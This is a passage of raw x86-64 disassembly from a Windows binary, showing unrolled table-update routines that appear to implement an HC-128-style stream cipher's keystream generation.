   1400064ae:	33 c8                	xor    %eax,%ecx
   1400064b0:	41 8b 83 50 10 00 00 	mov    0x1050(%r11),%eax
   1400064b7:	c1 c8 18             	ror    $0x18,%eax
   1400064ba:	03 c8                	add    %eax,%ecx
   1400064bc:	41 01 08             	add    %ecx,(%r8)
   1400064bf:	41 8b 00             	mov    (%r8),%eax
   1400064c2:	41 89 83 78 10 00 00 	mov    %eax,0x1078(%r11)
   1400064c9:	41 33 10             	xor    (%r8),%edx
   1400064cc:	89 56 38             	mov    %edx,0x38(%rsi)
   1400064cf:	41 8b 93 4c 10 00 00 	mov    0x104c(%r11),%edx
   1400064d6:	8b c2                	mov    %edx,%eax
   1400064d8:	c1 e8 10             	shr    $0x10,%eax
   1400064db:	0f b6 c8             	movzbl %al,%ecx
   1400064de:	0f b6 c2             	movzbl %dl,%eax
   1400064e1:	45 8b 84 8b 00 04 00 	mov    0x400(%r11,%rcx,4),%r8d
   1400064e8:	00 
   1400064e9:	45 03 04 83          	add    (%r11,%rax,4),%r8d
   1400064ed:	8d 87 00 02 00 00    	lea    0x200(%rdi),%eax
   1400064f3:	41 8b 14 83          	mov    (%r11,%rax,4),%edx
   1400064f7:	41 8b 83 70 10 00 00 	mov    0x1070(%r11),%eax
   1400064fe:	c1 c8 16             	ror    $0x16,%eax
   140006501:	c1 ca 09             	ror    $0x9,%edx
   140006504:	33 d0                	xor    %eax,%edx
   140006506:	41 8b 83 54 10 00 00 	mov    0x1054(%r11),%eax
   14000650d:	c1 c8 18             	ror    $0x18,%eax
   140006510:	03 d0                	add    %eax,%edx
   140006512:	41 01 11             	add    %edx,(%r9)
   140006515:	41 8b 01             	mov    (%r9),%eax
   140006518:	41 89 83 7c 10 00 00 	mov    %eax,0x107c(%r11)
   14000651f:	45 33 01             	xor    (%r9),%r8d
   140006522:	44 89 46 3c          	mov    %r8d,0x3c(%rsi)
   140006526:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000652b:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140006530:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140006535:	c3                   	ret
   140006536:	cc                   	int3
   140006537:	cc                   	int3
   140006538:	cc                   	int3
   140006539:	cc                   	int3
   14000653a:	cc                   	int3
   14000653b:	cc                   	int3
   14000653c:	cc                   	int3
   14000653d:	cc                   	int3
   14000653e:	cc                   	int3
   14000653f:	cc                   	int3
   140006540:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006545:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000654a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000654f:	8b 91 80 10 00 00    	mov    0x1080(%rcx),%edx
   140006555:	48 8b d9             	mov    %rcx,%rbx
   140006558:	8b fa                	mov    %edx,%edi
   14000655a:	81 e7 ff 01 00 00    	and    $0x1ff,%edi
   140006560:	8d 42 10             	lea    0x10(%rdx),%eax
   140006563:	25 ff 03 00 00       	and    $0x3ff,%eax
   140006568:	8d 77 10             	lea    0x10(%rdi),%esi
   14000656b:	89 81 80 10 00 00    	mov    %eax,0x1080(%rcx)
   140006571:	81 e6 ff 01 00 00    	and    $0x1ff,%esi
   140006577:	81 fa 00 02 00 00    	cmp    $0x200,%edx
   14000657d:	0f 83 63 05 00 00    	jae    0x140006ae6
   140006583:	8b 91 10 10 00 00    	mov    0x1010(%rcx),%edx
   140006589:	4c 8d 0c b9          	lea    (%rcx,%rdi,4),%r9
   14000658d:	44 8b 81 34 10 00 00 	mov    0x1034(%rcx),%r8d
   140006594:	8d 47 01             	lea    0x1(%rdi),%eax
   140006597:	4c 8d 1c 81          	lea    (%rcx,%rax,4),%r11
   14000659b:	41 c1 c8 0a          	ror    $0xa,%r8d
   14000659f:	41 8b 03             	mov    (%r11),%eax
   1400065a2:	c1 c8 17             	ror    $0x17,%eax
   1400065a5:	44 33 c0             	xor    %eax,%r8d
   1400065a8:	8b 81 18 10 00 00    	mov    0x1018(%rcx),%eax
   1400065ae:	c1 c8 08             	ror    $0x8,%eax
   1400065b1:	44 03 c0             	add    %eax,%r8d
   1400065b4:	8b c2                	mov    %edx,%eax
   1400065b6:	45 03 01             	add    (%r9),%r8d
   1400065b9:	c1 e8 10             	shr    $0x10,%eax
   1400065bc:	0f b6 c8             	movzbl %al,%ecx
   1400065bf:	0f b6 c2             	movzbl %dl,%eax
   1400065c2:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   1400065c9:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   1400065d0:	8d 47 02             	lea    0x2(%rdi),%eax
   1400065d3:	44 33 c2             	xor    %edx,%r8d
   1400065d6:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   1400065da:	45 89 01             	mov    %r8d,(%r9)
   1400065dd:	8b 93 14 10 00 00    	mov    0x1014(%rbx),%edx
   1400065e3:	8b 83 38 10 00 00    	mov    0x1038(%rbx),%eax
   1400065e9:	44 89 83 00 10 00 00 	mov    %r8d,0x1000(%rbx)
   1400065f0:	45 8b 02             	mov    (%r10),%r8d
   1400065f3:	c1 c8 0a             	ror    $0xa,%eax
   1400065f6:	41 c1 c8 17          	ror    $0x17,%r8d
   1400065fa:	44 33 c0             	xor    %eax,%r8d
   1400065fd:	8b 83 1c 10 00 00    	mov    0x101c(%rbx),%eax
   140006603:	c1 c8 08             	ror    $0x8,%eax
   140006606:	44 03 c0             	add    %eax,%r8d
   140006609:	8b c2                	mov    %edx,%eax
   14000660b:	45 03 03             	add    (%r11),%r8d
   14000660e:	c1 e8 10             	shr    $0x10,%eax
   140006611:	0f b6 c8             	movzbl %al,%ecx
   140006614:	0f b6 c2             	movzbl %dl,%eax
   140006617:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   14000661e:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   140006625:	8d 47 03             	lea    0x3(%rdi),%eax
   140006628:	44 33 c2             	xor    %edx,%r8d
   14000662b:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   14000662f:	45 89 03             	mov    %r8d,(%r11)
   140006632:	8b 93 18 10 00 00    	mov    0x1018(%rbx),%edx
   140006638:	8b 83 3c 10 00 00    	mov    0x103c(%rbx),%eax
   14000663e:	44 89 83 04 10 00 00 	mov    %r8d,0x1004(%rbx)
   140006645:	45 8b 01             	mov    (%r9),%r8d
   140006648:	c1 c8 0a             	ror    $0xa,%eax
   14000664b:	41 c1 c8 17          	ror    $0x17,%r8d
   14000664f:	44 33 c0             	xor    %eax,%r8d
   140006652:	8b 83 20 10 00 00    	mov    0x1020(%rbx),%eax
   140006658:	c1 c8 08             	ror    $0x8,%eax
   14000665b:	44 03 c0             	add    %eax,%r8d
   14000665e:	8b c2                	mov    %edx,%eax
   140006660:	45 03 02             	add    (%r10),%r8d
   140006663:	c1 e8 10             	shr    $0x10,%eax
   140006666:	0f b6 c8             	movzbl %al,%ecx
   140006669:	0f b6 c2             	movzbl %dl,%eax
   14000666c:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   140006673:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   14000667a:	8d 47 04             	lea    0x4(%rdi),%eax
   14000667d:	44 33 c2             	xor    %edx,%r8d
   140006680:	45 89 02             	mov    %r8d,(%r10)
   140006683:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006687:	8b 93 1c 10 00 00    	mov    0x101c(%rbx),%edx
   14000668d:	44 89 83 08 10 00 00 	mov    %r8d,0x1008(%rbx)
   140006694:	41 8b 02             	mov    (%r10),%eax
   140006697:	44 8b 83 00 10 00 00 	mov    0x1000(%rbx),%r8d
   14000669e:	c1 c8 17             	ror    $0x17,%eax
   1400066a1:	41 c1 c8 0a          	ror    $0xa,%r8d
   1400066a5:	44 33 c0             	xor    %eax,%r8d
   1400066a8:	8b 83 24 10 00 00    	mov    0x1024(%rbx),%eax
   1400066ae:	c1 c8 08             	ror    $0x8,%eax
   1400066b1:	44 03 c0             	add    %eax,%r8d
   1400066b4:	8b c2                	mov    %edx,%eax
   1400066b6:	45 03 01             	add    (%r9),%r8d
   1400066b9:	c1 e8 10             	shr    $0x10,%eax
   1400066bc:	0f b6 c8             	movzbl %al,%ecx
   1400066bf:	0f b6 c2             	movzbl %dl,%eax
   1400066c2:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   1400066c9:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   1400066d0:	8d 47 05             	lea    0x5(%rdi),%eax
   1400066d3:	44 33 c2             	xor    %edx,%r8d
   1400066d6:	45 89 01             	mov    %r8d,(%r9)
   1400066d9:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   1400066dd:	8b 93 20 10 00 00    	mov    0x1020(%rbx),%edx
   1400066e3:	44 89 83 0c 10 00 00 	mov    %r8d,0x100c(%rbx)
   1400066ea:	41 8b 01             	mov    (%r9),%eax
   1400066ed:	44 8b 83 04 10 00 00 	mov    0x1004(%rbx),%r8d
   1400066f4:	c1 c8 17             	ror    $0x17,%eax
   1400066f7:	41 c1 c8 0a          	ror    $0xa,%r8d
   1400066fb:	44 33 c0             	xor    %eax,%r8d
   1400066fe:	8b 83 28 10 00 00    	mov    0x1028(%rbx),%eax
   140006704:	c1 c8 08             	ror    $0x8,%eax
   140006707:	44 03 c0             	add    %eax,%r8d
   14000670a:	8b c2                	mov    %edx,%eax
   14000670c:	45 03 02             	add    (%r10),%r8d
   14000670f:	c1 e8 10             	shr    $0x10,%eax
   140006712:	0f b6 c8             	movzbl %al,%ecx
   140006715:	0f b6 c2             	movzbl %dl,%eax
   140006718:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   14000671f:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   140006726:	8d 47 06             	lea    0x6(%rdi),%eax
   140006729:	44 33 c2             	xor    %edx,%r8d
   14000672c:	4c 8d 1c 83          	lea    (%rbx,%rax,4),%r11
   140006730:	45 89 02             	mov    %r8d,(%r10)
   140006733:	8b 93 24 10 00 00    	mov    0x1024(%rbx),%edx
   140006739:	8b 83 08 10 00 00    	mov    0x1008(%rbx),%eax
   14000673f:	44 89 83 10 10 00 00 	mov    %r8d,0x1010(%rbx)
   140006746:	45 8b 03             	mov    (%r11),%r8d
   140006749:	c1 c8 0a             	ror    $0xa,%eax
   14000674c:	41 c1 c8 17          	ror    $0x17,%r8d
   140006750:	44 33 c0             	xor    %eax,%r8d
   140006753:	8b 83 2c 10 00 00    	mov    0x102c(%rbx),%eax
   140006759:	c1 c8 08             	ror    $0x8,%eax
   14000675c:	44 03 c0             	add    %eax,%r8d
   14000675f:	8b c2                	mov    %edx,%eax
   140006761:	45 03 01             	add    (%r9),%r8d
   140006764:	c1 e8 10             	shr    $0x10,%eax
   140006767:	0f b6 c8             	movzbl %al,%ecx
   14000676a:	0f b6 c2             	movzbl %dl,%eax
   14000676d:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   140006774:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   14000677b:	8d 47 07             	lea    0x7(%rdi),%eax
   14000677e:	44 33 c2             	xor    %edx,%r8d
   140006781:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006785:	45 89 01             	mov    %r8d,(%r9)
   140006788:	8b 93 28 10 00 00    	mov    0x1028(%rbx),%edx
   14000678e:	8b 83 0c 10 00 00    	mov    0x100c(%rbx),%eax
   140006794:	44 89 83 14 10 00 00 	mov    %r8d,0x1014(%rbx)
   14000679b:	45 8b 02             	mov    (%r10),%r8d
   14000679e:	c1 c8 0a             	ror    $0xa,%eax
   1400067a1:	41 c1 c8 17          	ror    $0x17,%r8d
   1400067a5:	44 33 c0             	xor    %eax,%r8d
   1400067a8:	8b 83 30 10 00 00    	mov    0x1030(%rbx),%eax
   1400067ae:	c1 c8 08             	ror    $0x8,%eax
   1400067b1:	44 03 c0             	add    %eax,%r8d
   1400067b4:	8b c2                	mov    %edx,%eax
   1400067b6:	45 03 03             	add    (%r11),%r8d
   1400067b9:	c1 e8 10             	shr    $0x10,%eax
   1400067bc:	0f b6 c8             	movzbl %al,%ecx
   1400067bf:	0f b6 c2             	movzbl %dl,%eax
   1400067c2:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   1400067c9:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   1400067d0:	8d 47 08             	lea    0x8(%rdi),%eax
   1400067d3:	44 33 c2             	xor    %edx,%r8d
   1400067d6:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   1400067da:	45 89 03             	mov    %r8d,(%r11)
   1400067dd:	8b 83 10 10 00 00    	mov    0x1010(%rbx),%eax
   1400067e3:	8b 93 2c 10 00 00    	mov    0x102c(%rbx),%edx
   1400067e9:	44 89 83 18 10 00 00 	mov    %r8d,0x1018(%rbx)
   1400067f0:	45 8b 01             	mov    (%r9),%r8d
   1400067f3:	c1 c8 0a             	ror    $0xa,%eax
   1400067f6:	41 c1 c8 17          	ror    $0x17,%r8d
   1400067fa:	44 33 c0             	xor    %eax,%r8d
   1400067fd:	8b 83 34 10 00 00    	mov    0x1034(%rbx),%eax
   140006803:	c1 c8 08             	ror    $0x8,%eax
   140006806:	44 03 c0             	add    %eax,%r8d
   140006809:	8b c2                	mov    %edx,%eax
   14000680b:	45 03 02             	add    (%r10),%r8d
   14000680e:	c1 e8 10             	shr    $0x10,%eax
   140006811:	0f b6 c8             	movzbl %al,%ecx
   140006814:	0f b6 c2             	movzbl %dl,%eax
   140006817:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   14000681e:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   140006825:	8d 47 09             	lea    0x9(%rdi),%eax
   140006828:	44 33 c2             	xor    %edx,%r8d
   14000682b:	45 89 02             	mov    %r8d,(%r10)
   14000682e:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006832:	8b 93 30 10 00 00    	mov    0x1030(%rbx),%edx
   140006838:	44 89 83 1c 10 00 00 	mov    %r8d,0x101c(%rbx)
   14000683f:	41 8b 02             	mov    (%r10),%eax
   140006842:	44 8b 83 14 10 00 00 	mov    0x1014(%rbx),%r8d
   140006849:	c1 c8 17             	ror    $0x17,%eax
   14000684c:	41 c1 c8 0a          	ror    $0xa,%r8d
   140006850:	44 33 c0             	xor    %eax,%r8d
   140006853:	8b 83 38 10 00 00    	mov    0x1038(%rbx),%eax
   140006859:	c1 c8 08             	ror    $0x8,%eax
   14000685c:	44 03 c0             	add    %eax,%r8d
   14000685f:	8b c2                	mov    %edx,%eax
   140006861:	45 03 01             	add    (%r9),%r8d
   140006864:	c1 e8 10             	shr    $0x10,%eax
   140006867:	0f b6 c8             	movzbl %al,%ecx
   14000686a:	0f b6 c2             	movzbl %dl,%eax
   14000686d:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   140006874:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   14000687b:	8d 47 0a             	lea    0xa(%rdi),%eax
   14000687e:	44 33 c2             	xor    %edx,%r8d
   140006881:	45 89 01             	mov    %r8d,(%r9)
   140006884:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006888:	8b 93 34 10 00 00    	mov    0x1034(%rbx),%edx
   14000688e:	8b 83 18 10 00 00    	mov    0x1018(%rbx),%eax
   140006894:	44 89 83 20 10 00 00 	mov    %r8d,0x1020(%rbx)
   14000689b:	45 8b 01             	mov    (%r9),%r8d
   14000689e:	c1 c8 0a             	ror    $0xa,%eax
   1400068a1:	41 c1 c8 17          	ror    $0x17,%r8d
   1400068a5:	44 33 c0             	xor    %eax,%r8d
   1400068a8:	8b 83 3c 10 00 00    	mov    0x103c(%rbx),%eax
   1400068ae:	c1 c8 08             	ror    $0x8,%eax
   1400068b1:	44 03 c0             	add    %eax,%r8d
   1400068b4:	8b c2                	mov    %edx,%eax
   1400068b6:	45 03 02             	add    (%r10),%r8d
   1400068b9:	c1 e8 10             	shr    $0x10,%eax
   1400068bc:	0f b6 c8             	movzbl %al,%ecx
   1400068bf:	0f b6 c2             	movzbl %dl,%eax
   1400068c2:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   1400068c9:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   1400068d0:	8d 47 0b             	lea    0xb(%rdi),%eax
   1400068d3:	44 33 c2             	xor    %edx,%r8d
   1400068d6:	45 89 02             	mov    %r8d,(%r10)
   1400068d9:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   1400068dd:	8b 93 38 10 00 00    	mov    0x1038(%rbx),%edx
   1400068e3:	8b 83 1c 10 00 00    	mov    0x101c(%rbx),%eax
   1400068e9:	44 89 83 24 10 00 00 	mov    %r8d,0x1024(%rbx)
   1400068f0:	45 8b 02             	mov    (%r10),%r8d
   1400068f3:	c1 c8 0a             	ror    $0xa,%eax
   1400068f6:	41 c1 c8 17          	ror    $0x17,%r8d
   1400068fa:	44 33 c0             	xor    %eax,%r8d
   1400068fd:	8b 83 00 10 00 00    	mov    0x1000(%rbx),%eax
   140006903:	c1 c8 08             	ror    $0x8,%eax
   140006906:	44 03 c0             	add    %eax,%r8d
   140006909:	8b c2                	mov    %edx,%eax
   14000690b:	45 03 01             	add    (%r9),%r8d
   14000690e:	c1 e8 10             	shr    $0x10,%eax
   140006911:	0f b6 c8             	movzbl %al,%ecx
   140006914:	0f b6 c2             	movzbl %dl,%eax
   140006917:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   14000691e:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   140006925:	8d 47 0c             	lea    0xc(%rdi),%eax
   140006928:	44 33 c2             	xor    %edx,%r8d
   14000692b:	45 89 01             	mov    %r8d,(%r9)
   14000692e:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006932:	8b 83 20 10 00 00    	mov    0x1020(%rbx),%eax
   140006938:	8b 93 3c 10 00 00    	mov    0x103c(%rbx),%edx
   14000693e:	44 89 83 28 10 00 00 	mov    %r8d,0x1028(%rbx)
   140006945:	45 8b 01             	mov    (%r9),%r8d
   140006948:	c1 c8 0a             	ror    $0xa,%eax
   14000694b:	41 c1 c8 17          	ror    $0x17,%r8d
   14000694f:	44 33 c0             	xor    %eax,%r8d
   140006952:	8b 83 04 10 00 00    	mov    0x1004(%rbx),%eax
   140006958:	c1 c8 08             	ror    $0x8,%eax
   14000695b:	44 03 c0             	add    %eax,%r8d
   14000695e:	45 03 02             	add    (%r10),%r8d
   140006961:	8b c2                	mov    %edx,%eax
   140006963:	c1 e8 10             	shr    $0x10,%eax
   140006966:	0f b6 c8             	movzbl %al,%ecx
   140006969:	0f b6 c2             	movzbl %dl,%eax
   14000696c:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   140006973:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   14000697a:	8d 47 0d             	lea    0xd(%rdi),%eax
   14000697d:	44 33 c2             	xor    %edx,%r8d
   140006980:	45 89 02             	mov    %r8d,(%r10)
   140006983:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006987:	8b 93 00 10 00 00    	mov    0x1000(%rbx),%edx
   14000698d:	8b 83 24 10 00 00    	mov    0x1024(%rbx),%eax
   140006993:	44 89 83 2c 10 00 00 	mov    %r8d,0x102c(%rbx)
   14000699a:	45 8b 02             	mov    (%r10),%r8d
   14000699d:	c1 c8 0a             	ror    $0xa,%eax
   1400069a0:	41 c1 c8 17          	ror    $0x17,%r8d
   1400069a4:	44 33 c0             	xor    %eax,%r8d
   1400069a7:	8b 83 08 10 00 00    	mov    0x1008(%rbx),%eax
   1400069ad:	c1 c8 08             	ror    $0x8,%eax
   1400069b0:	44 03 c0             	add    %eax,%r8d
   1400069b3:	8b c2                	mov    %edx,%eax
   1400069b5:	45 03 01             	add    (%r9),%r8d
   1400069b8:	c1 e8 10             	shr    $0x10,%eax
   1400069bb:	0f b6 c8             	movzbl %al,%ecx
   1400069be:	0f b6 c2             	movzbl %dl,%eax
   1400069c1:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   1400069c8:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   1400069cf:	8d 47 0e             	lea    0xe(%rdi),%eax
   1400069d2:	44 33 c2             	xor    %edx,%r8d
   1400069d5:	4c 8d 1c 83          	lea    (%rbx,%rax,4),%r11
   1400069d9:	45 89 01             	mov    %r8d,(%r9)
   1400069dc:	8b 93 04 10 00 00    	mov    0x1004(%rbx),%edx
   1400069e2:	8b 83 28 10 00 00    	mov    0x1028(%rbx),%eax
   1400069e8:	44 89 83 30 10 00 00 	mov    %r8d,0x1030(%rbx)
   1400069ef:	45 8b 03             	mov    (%r11),%r8d
   1400069f2:	c1 c8 0a             	ror    $0xa,%eax
   1400069f5:	41 c1 c8 17          	ror    $0x17,%r8d
   1400069f9:	44 33 c0             	xor    %eax,%r8d
   1400069fc:	8b 83 0c 10 00 00    	mov    0x100c(%rbx),%eax
   140006a02:	c1 c8 08             	ror    $0x8,%eax
   140006a05:	44 03 c0             	add    %eax,%r8d
   140006a08:	8b c2                	mov    %edx,%eax
   140006a0a:	45 03 02             	add    (%r10),%r8d
   140006a0d:	c1 e8 10             	shr    $0x10,%eax
   140006a10:	0f b6 c8             	movzbl %al,%ecx
   140006a13:	0f b6 c2             	movzbl %dl,%eax
   140006a16:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   140006a1d:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   140006a24:	8d 47 0f             	lea    0xf(%rdi),%eax
   140006a27:	44 33 c2             	xor    %edx,%r8d
   140006a2a:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006a2e:	45 89 02             	mov    %r8d,(%r10)
   140006a31:	8b 93 08 10 00 00    	mov    0x1008(%rbx),%edx
   140006a37:	44 89 83 34 10 00 00 	mov    %r8d,0x1034(%rbx)
   140006a3e:	41 8b 01             	mov    (%r9),%eax
   140006a41:	44 8b 83 2c 10 00 00 	mov    0x102c(%rbx),%r8d
   140006a48:	c1 c8 17             	ror    $0x17,%eax
   140006a4b:	41 c1 c8 0a          	ror    $0xa,%r8d
   140006a4f:	44 33 c0             	xor    %eax,%r8d
   140006a52:	8b 83 10 10 00 00    	mov    0x1010(%rbx),%eax
   140006a58:	c1 c8 08             	ror    $0x8,%eax
   140006a5b:	44 03 c0             	add    %eax,%r8d
   140006a5e:	8b c2                	mov    %edx,%eax
   140006a60:	45 03 03             	add    (%r11),%r8d
   140006a63:	c1 e8 10             	shr    $0x10,%eax
   140006a66:	0f b6 c8             	movzbl %al,%ecx
   140006a69:	0f b6 c2             	movzbl %dl,%eax
   140006a6c:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   140006a73:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   140006a7a:	44 33 c2             	xor    %edx,%r8d
   140006a7d:	45 89 03             	mov    %r8d,(%r11)
   140006a80:	8b 83 30 10 00 00    	mov    0x1030(%rbx),%eax
   140006a86:	8b 93 0c 10 00 00    	mov    0x100c(%rbx),%edx
   140006a8c:	44 89 83 38 10 00 00 	mov    %r8d,0x1038(%rbx)
   140006a93:	44 8b 04 b3          	mov    (%rbx,%rsi,4),%r8d
   140006a97:	c1 c8 0a             	ror    $0xa,%eax
   140006a9a:	41 c1 c8 17          	ror    $0x17,%r8d
   140006a9e:	44 33 c0             	xor    %eax,%r8d
   140006aa1:	8b 83 14 10 00 00    	mov    0x1014(%rbx),%eax
   140006aa7:	c1 c8 08             	ror    $0x8,%eax
   140006aaa:	44 03 c0             	add    %eax,%r8d
   140006aad:	8b c2                	mov    %edx,%eax
   140006aaf:	45 03 01             	add    (%r9),%r8d
   140006ab2:	c1 e8 10             	shr    $0x10,%eax
   140006ab5:	0f b6 c8             	movzbl %al,%ecx
   140006ab8:	0f b6 c2             	movzbl %dl,%eax
   140006abb:	8b 94 8b 00 0c 00 00 	mov    0xc00(%rbx,%rcx,4),%edx
   140006ac2:	03 94 83 00 08 00 00 	add    0x800(%rbx,%rax,4),%edx
   140006ac9:	44 33 c2             	xor    %edx,%r8d
   140006acc:	45 89 01             	mov    %r8d,(%r9)
   140006acf:	44 89 83 3c 10 00 00 	mov    %r8d,0x103c(%rbx)
   140006ad6:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140006adb:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140006ae0:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140006ae5:	c3                   	ret
   140006ae6:	8b 91 50 10 00 00    	mov    0x1050(%rcx),%edx
   140006aec:	8d 87 01 02 00 00    	lea    0x201(%rdi),%eax
   140006af2:	44 8b 81 74 10 00 00 	mov    0x1074(%rcx),%r8d
   140006af9:	4c 8d 1c 81          	lea    (%rcx,%rax,4),%r11
   140006afd:	41 c1 c8 16          	ror    $0x16,%r8d
   140006b01:	8d 87 00 02 00 00    	lea    0x200(%rdi),%eax
   140006b07:	4c 8d 0c 81          	lea    (%rcx,%rax,4),%r9
   140006b0b:	41 8b 03             	mov    (%r11),%eax
   140006b0e:	c1 c8 09             	ror    $0x9,%eax
   140006b11:	44 33 c0             	xor    %eax,%r8d
   140006b14:	8b 81 58 10 00 00    	mov    0x1058(%rcx),%eax
   140006b1a:	c1 c8 18             	ror    $0x18,%eax
   140006b1d:	44 03 c0             	add    %eax,%r8d
   140006b20:	8b c2                	mov    %edx,%eax
   140006b22:	45 03 01             	add    (%r9),%r8d
   140006b25:	c1 e8 10             	shr    $0x10,%eax
   140006b28:	0f b6 c8             	movzbl %al,%ecx
   140006b2b:	0f b6 c2             	movzbl %dl,%eax
   140006b2e:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006b35:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006b38:	8d 87 02 02 00 00    	lea    0x202(%rdi),%eax
   140006b3e:	44 33 c2             	xor    %edx,%r8d
   140006b41:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006b45:	45 89 01             	mov    %r8d,(%r9)
   140006b48:	8b 93 54 10 00 00    	mov    0x1054(%rbx),%edx
   140006b4e:	44 89 83 40 10 00 00 	mov    %r8d,0x1040(%rbx)
   140006b55:	41 8b 02             	mov    (%r10),%eax
   140006b58:	44 8b 83 78 10 00 00 	mov    0x1078(%rbx),%r8d
   140006b5f:	c1 c8 09             	ror    $0x9,%eax
   140006b62:	41 c1 c8 16          	ror    $0x16,%r8d
   140006b66:	44 33 c0             	xor    %eax,%r8d
   140006b69:	8b 83 5c 10 00 00    	mov    0x105c(%rbx),%eax
   140006b6f:	c1 c8 18             	ror    $0x18,%eax
   140006b72:	44 03 c0             	add    %eax,%r8d
   140006b75:	8b c2                	mov    %edx,%eax
   140006b77:	45 03 03             	add    (%r11),%r8d
   140006b7a:	c1 e8 10             	shr    $0x10,%eax
   140006b7d:	0f b6 c8             	movzbl %al,%ecx
   140006b80:	0f b6 c2             	movzbl %dl,%eax
   140006b83:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006b8a:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006b8d:	8d 87 03 02 00 00    	lea    0x203(%rdi),%eax
   140006b93:	44 33 c2             	xor    %edx,%r8d
   140006b96:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006b9a:	45 89 03             	mov    %r8d,(%r11)
   140006b9d:	8b 93 58 10 00 00    	mov    0x1058(%rbx),%edx
   140006ba3:	44 89 83 44 10 00 00 	mov    %r8d,0x1044(%rbx)
   140006baa:	41 8b 01             	mov    (%r9),%eax
   140006bad:	44 8b 83 7c 10 00 00 	mov    0x107c(%rbx),%r8d
   140006bb4:	c1 c8 09             	ror    $0x9,%eax
   140006bb7:	41 c1 c8 16          	ror    $0x16,%r8d
   140006bbb:	44 33 c0             	xor    %eax,%r8d
   140006bbe:	8b 83 60 10 00 00    	mov    0x1060(%rbx),%eax
   140006bc4:	c1 c8 18             	ror    $0x18,%eax
   140006bc7:	44 03 c0             	add    %eax,%r8d
   140006bca:	8b c2                	mov    %edx,%eax
   140006bcc:	45 03 02             	add    (%r10),%r8d
   140006bcf:	c1 e8 10             	shr    $0x10,%eax
   140006bd2:	0f b6 c8             	movzbl %al,%ecx
   140006bd5:	0f b6 c2             	movzbl %dl,%eax
   140006bd8:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006bdf:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006be2:	8d 87 04 02 00 00    	lea    0x204(%rdi),%eax
   140006be8:	44 33 c2             	xor    %edx,%r8d
   140006beb:	45 89 02             	mov    %r8d,(%r10)
   140006bee:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006bf2:	8b 93 5c 10 00 00    	mov    0x105c(%rbx),%edx
   140006bf8:	44 89 83 48 10 00 00 	mov    %r8d,0x1048(%rbx)
   140006bff:	41 8b 02             	mov    (%r10),%eax
   140006c02:	44 8b 83 40 10 00 00 	mov    0x1040(%rbx),%r8d
   140006c09:	c1 c8 09             	ror    $0x9,%eax
   140006c0c:	41 c1 c8 16          	ror    $0x16,%r8d
